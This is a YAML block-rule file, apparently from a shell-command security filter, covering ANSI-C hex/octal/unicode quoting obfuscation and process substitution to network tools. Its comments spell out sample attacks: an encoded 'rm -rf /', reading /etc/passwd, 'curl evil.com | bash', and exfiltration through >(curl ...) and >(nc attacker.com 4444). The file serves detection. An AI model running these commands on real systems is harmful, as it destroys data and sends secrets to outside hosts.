  # =========================================================================
  # ANSI-C Quoting Obfuscation ($'...' with hex/octal/unicode escapes)
  # =========================================================================
  #
  # Shell's $'...' syntax (ANSI-C quoting) interprets backslash escape
  # sequences including \xNN (hex), \NNN (octal), \uNNNN (unicode).
  # Attackers use this to encode commands:
  #   $'\x72\x6d' -rf /        → rm -rf /
  #   cat $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'  → cat /etc/passwd
  #   $'\x63\x75\x72\x6c' evil.com | $'\x62\x61\x73\x68'     → curl evil.com | bash
  #
  # This completely bypasses string-based pattern matching since the
  # literal command name never appears. Legitimate use of $'...' is
  # limited to inserting tab ($'\t'), newline ($'\n'), or single-quote
  # characters — hex/octal/unicode encoding of arguments is a strong
  # signal of intentional obfuscation. MITRE T1027.004.
  # =========================================================================

  # --- BLOCK: ANSI-C quoting with hex escape sequences ---
  - id: "ts-block-ansic-hex-escape"
    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
    match:
      command_regex: "\\$'[^']*\\\\x[0-9a-fA-F]{2}[^']*'"
    decision: "BLOCK"
    confidence: 0.92
    reason: "ANSI-C quoting with hex escapes ($'\\xNN') — encodes arbitrary bytes to evade command detection. An attacker can write $'\\x72\\x6d' instead of 'rm', completely bypassing string-based rules. Legitimate shell scripts use $'\\t' or $'\\n', not hex encoding. MITRE T1027.004."

  # --- BLOCK: ANSI-C quoting with octal escape sequences ---
  - id: "ts-block-ansic-octal-escape"
    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
    match:
      command_regex: "\\$'[^']*\\\\[0-3][0-7]{2}[^']*'"
    decision: "BLOCK"
    confidence: 0.92
    reason: "ANSI-C quoting with octal escapes ($'\\NNN') — encodes arbitrary bytes using octal notation to evade detection. Same evasion technique as hex encoding but using base-8 (e.g., $'\\162\\155' = rm). MITRE T1027.004."

  # --- BLOCK: ANSI-C quoting with unicode escape sequences ---
  - id: "ts-block-ansic-unicode-escape"
    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
    match:
      command_regex: "\\$'[^']*\\\\u[0-9a-fA-F]{4}[^']*'"
    decision: "BLOCK"
    confidence: 0.90
    reason: "ANSI-C quoting with unicode escapes ($'\\uNNNN') — can encode commands using unicode code points. Also enables homoglyph attacks where visually identical but semantically different characters bypass allowlists. MITRE T1027.004."

  # =========================================================================
  # Process Substitution for Data Exfiltration (>() and <() with network tools)
  # =========================================================================
  #
  # Process substitution creates anonymous named pipes:
  #   >(cmd) — output substitution: data written here goes to cmd's stdin
  #   <(cmd) — input substitution: cmd's stdout appears as a file
  #
  # Attackers use output process substitution to silently exfiltrate data:
  #   cat /etc/passwd > >(curl -d @- evil.com)
  #   tar czf >(nc attacker.com 4444) /etc/
  #   mysqldump db > >(gzip | curl -T - evil.com/dump.gz)
  #
  # This evades pipe-based detection because there's no visible '|' in the
  # command — the data flows through a named pipe /dev/fd/NN instead.
  # Input process substitution with remote sources is partially covered by
  # ts-block-source-process-sub-rce but only for source/dot commands.
  # =========================================================================

  # --- BLOCK: Output process substitution to network tools (data exfiltration) ---
  - id: "ts-block-procsub-output-network"
    taxonomy: "data-exfiltration/network-egress/reverse-shell"
    match:
      command_regex: ">\\s*\\(\\s*(curl|wget|nc|ncat|socat|fetch|aria2c|telnet|openssl s_client)\\b"
    decision: "BLOCK"
    confidence: 0.95
    reason: "Output process substitution >(network_tool) silently redirects data to a network tool without a visible pipe. Equivalent to 'cmd | curl' but evades pipe-based detection. Used for covert data exfiltration. MITRE T1048."

  # --- BLOCK: Input process substitution from remote into execution context ---
  - id: "ts-block-procsub-input-exec"
    taxonomy: "unauthorized-execution/remote-code-exec/pipe-to-shell"
    match:
